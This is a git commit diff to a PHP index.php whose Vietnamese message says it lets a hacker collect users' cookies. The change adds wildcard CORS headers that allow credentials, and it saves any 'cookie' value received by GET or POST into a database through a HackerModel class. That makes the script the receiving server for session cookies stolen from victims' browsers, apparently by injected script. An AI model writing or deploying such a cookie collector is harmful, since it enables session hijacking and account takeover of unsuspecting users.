82ceb257e67a10cf55622fcfefa68f40ddbd226c
Lê Hoàng Đức Thịnh <86552685+thinhle1908@users.noreply.github.com>
2022-10-21 15:56:38 +0700

    hoan thanh phuong thuc get hacker co the lay cookie nguoi dung

--- index.php
+++ index.php
@@ -1,4 +1,11 @@
 <?php
+header('Access-Control-Allow-Origin: *');
+header("Access-Control-Allow-Credentials: true");
+header('Access-Control-Allow-Methods: GET, PUT, POST, DELETE, OPTIONS');
+header('Access-Control-Max-Age: 1000');
+header('Access-Control-Allow-Headers: Origin, Content-Type, X-Auth-Token , Authorization');
+
+
 require_once 'models/HackerModel.php';
 $inputsession = new HackerModel;
 
@@ -8,6 +15,16 @@ if (isset($_GET['session_id'])) {
 }
 
 if (isset($_POST)) {
-   // echo $_POST['cookie'];
-    $inputsession->insertUser((json_encode($_POST)));
+    // echo $_POST['cookie'];
+    if (isset($_POST['cookie'])) {
+        $inputsession->insertUser(($_POST['cookie']));
+    }   
+}
+
+if (isset($_GET)) {
+    // echo $_POST['cookie'];
+    if (isset($_GET['cookie'])) {
+        $inputsession->insertUser(($_GET['cookie']));
+        return ($_GET);
+    }
 }
